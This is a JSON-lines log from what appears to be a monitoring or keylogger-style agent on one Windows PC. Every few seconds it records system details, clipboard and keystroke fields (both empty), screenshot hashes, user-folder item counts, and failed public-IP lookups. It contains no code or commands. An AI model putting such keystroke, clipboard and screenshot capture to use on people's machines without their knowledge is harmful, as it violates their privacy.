{"timestamp": "2025-06-14T07:12:37.240892+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d517ec223d99c305a5dbb126339d29323df45eec24fdcdceda844cbc0650ccc1", "_raw_log_hash": "5acf8fb642afc881d57cf8e0a39bb3b6b6b3ed90e89061e0d39b409777c9ef6c"}
{"timestamp": "2025-06-14T07:12:50.774241+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5c6f84cc10185920c8af3fb90344c76d9584ea73eed28cc0a8247f2b0a156667", "_raw_log_hash": "d879a1d3f81bfb1238a800b878021fd331516f37c87be6372fc244ee1da12e1b"}
{"timestamp": "2025-06-14T07:13:04.284399+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8021375555e0a875b939c66cac16da6a69932a545e879d694eabe94826dce7a1", "_raw_log_hash": "f3f484dfb1467faa3ea00b3ec14a4814031bea4263d1d26c9eab6aed84cc8c90"}
{"timestamp": "2025-06-14T07:13:17.892650+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b91a09afa916d88950c6eaf86713b3fbd7906f8ecdafcb80f25832d828e69aec", "_raw_log_hash": "d687304224eaadbee9a7f88b04b3aa02bf8600e7498706e9b8071e872c5fdde4"}
{"timestamp": "2025-06-14T07:13:31.388928+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2e47d600f834e4e06b0c3a9b59e7ea6ab3204b863fe92b09853400dda91dd982", "_raw_log_hash": "a769435c6632cfb9d765e70b4fe53a23873ebae3db04f29b510f7015765d0741"}
{"timestamp": "2025-06-14T07:13:44.953548+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5bf3bb3f52f14ef3d7a12dfbd05e16628d53b9506739addc236ad80dabe0b216", "_raw_log_hash": "22eef6ccb9de4a1460b3f7b126e2854905edfa61cdb5cf6dbf113f4ff81908a0"}
{"timestamp": "2025-06-14T07:13:58.498903+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5ab2a31fa7ea5ab40cde657f216fa3deed81fc28abfca76a33c2c42ecc150e04", "_raw_log_hash": "d07a7121d4659a710fe70ba528d6b398f71fe9f00790f1e4744f47c0061aecb6"}
{"timestamp": "2025-06-14T07:14:12.008019+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "12d3ac5613a138c80f739d55f9b0b2065e83a09d855b9d1a5b3970a49345fe98", "_raw_log_hash": "519b6946ed04b129d8d4c41fa0570448f235ba736c57e675e42404001a9a4b69"}
{"timestamp": "2025-06-14T07:14:25.555497+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0602292acd692adc532f0a25ad4fde95ef71a4198e5c739dad74cc31bafaf76d", "_raw_log_hash": "79cb8d13030d6cb29bbae1cd94207cfa57f76720375efde2414dc0c0b76cfcf0"}
{"timestamp": "2025-06-14T07:14:39.061148+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3161ee4f04d933dc05dc55dbc4d1bf819a8ae2bb4454cb8081f17388202fa5cc", "_raw_log_hash": "f392209cec2bb6f19c9844d27d7218e4cfcb94a6ef63ee2d2b09bbda0cbad3de"}
{"timestamp": "2025-06-14T07:14:52.524361+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "10ad0ed7961d0bb0db68b05fc9853669e77ae0e33a78b532a3dc3f92be2804a2", "_raw_log_hash": "f34952aae0da3251770b879f9023d7a467f2b254bef3bfeccd3cbbfe5e24b2de"}
{"timestamp": "2025-06-14T07:15:06.065557+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "460d9fbd6b9ba3b4c6b41836aa66ef6c887a49d039b4cc0e11a960d6ac7d6cb0", "_raw_log_hash": "076586fd548829926c44626e9b9dd05b567168ad0150ff936e32b970b8e60ce6"}
{"timestamp": "2025-06-14T07:15:19.577048+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59058a13ae418ee6ef2b7cabc0fd93dbf2dbb54ba3438bbef4091b0aa182d4af", "_raw_log_hash": "4eda288f17e6e63d504aa812f1b1776176db74f516f590de003eebaae7239e71"}
{"timestamp": "2025-06-14T07:15:33.123192+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e524a32c64daefdbb0ab6428daf2c109b959d4db00cbb00ab95b5b478c0b9f29", "_raw_log_hash": "e188fc94a51adb62795155339d3a5c75ec859f30865cc6cfa06a70be614d5e19"}
{"timestamp": "2025-06-14T07:15:46.634825+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b44df09305adef85cb8ec0b4cf568cc6d6b67a825d5e38fc915ff8d7ddcc081c", "_raw_log_hash": "80f6419e776b3e30cacea593830f2c1effbbf5e4a1a71a0c533381d42726de20"}
{"timestamp": "2025-06-14T07:16:00.130691+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c2572ed2b976a4bd9df2b33ac54e71b13275c26bdebcca9d26d2b5889ef28c61", "_raw_log_hash": "1b01c9f2e21f03218c524443d684f7b5b4dbed837872d0c9ab1316904a866dba"}
{"timestamp": "2025-06-14T07:16:13.618182+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D1D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4a4d811edfdd69a5844020e2bce5ce566e3d1ad5af46b23507bae45908cc3f70", "_raw_log_hash": "5371cb2eadee9260bca68f49d135b9221a31217167a7318d3fa8eaa2294a57f7"}
{"timestamp": "2025-06-14T07:16:27.107437+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "72b349778592e72f7ff7b741ca210cd95d68343239b8486c7ba5bc66599ecc64", "_raw_log_hash": "a317e09dc3e8320f9fd8fd0b01cefa9e4a97d9c8c97a397fe09d377d4039617e"}
{"timestamp": "2025-06-14T07:16:40.629688+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a20d519e889c46eef957b77aa3d98b7cf6b6b95898c38ea4b773235b3d567837", "_raw_log_hash": "113bbd7e344c6f06100024af12c516fd129d0d0d1d92c027a755b6b3fbd2677f"}
{"timestamp": "2025-06-14T07:16:54.140889+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "42b94f915f5ad431cc550720cd3f92f2c906283983cd031eedb0f9fc0f0e5f56", "_raw_log_hash": "c4b515a8fdb5fe740d5fcbdbedb1095566b7676387c2c7c4ded88fc1ca44014e"}
{"timestamp": "2025-06-14T07:17:07.650413+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "976cfff8357308009c71f63034b2855074753e2b2ccbdf0438287c1cc2a5af23", "_raw_log_hash": "64ae7c41208758b2d739c69e77d51afb7254976178ab916bd0161b02def2e575"}
{"timestamp": "2025-06-14T07:17:21.137995+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "835e2811e445bb86049ee60cd3901b9d0c9d199f3ed1fa083c321d7ddb9cc65b", "_raw_log_hash": "272a92bc6e7d78715a73f532e238bf9dc6904fe6998de860f10f478f594affeb"}
{"timestamp": "2025-06-14T07:17:34.657767+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5503b7f63dde60a3ed5881c50cc322a7dcbec089d369f8f0dff1e66665227919", "_raw_log_hash": "44e8a6f692bb4d21c9aacde39b44a859e48d950a2d29b752794396babe44c237"}
{"timestamp": "2025-06-14T07:17:48.121820+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1e9a7154fbf02b596007cb8b9bde233a08909346c3c8124fb2026fe35fb3a0f3", "_raw_log_hash": "712f1451593547501c8fd18c0392b038daada704dbce5f14c3b8ea4dc5e8cc1a"}
{"timestamp": "2025-06-14T07:18:01.648422+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9cd18f0ed6248fa5194c140e75096ffdc0fa8f3f886f0860358fcea77f81813e", "_raw_log_hash": "5f648fe4531720c6f7fe247bf25f0b4402c294ffd544d8ebb3e134ae9886c769"}
{"timestamp": "2025-06-14T07:18:15.166685+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9eaab7c34f2d3bdf7fe408f820af59d10a76036424b00a2117b9d32393c4f883", "_raw_log_hash": "f8f7925b4e3b27f2633b8e881ab038986875af559a3c04dd191c1ddc1ef45414"}
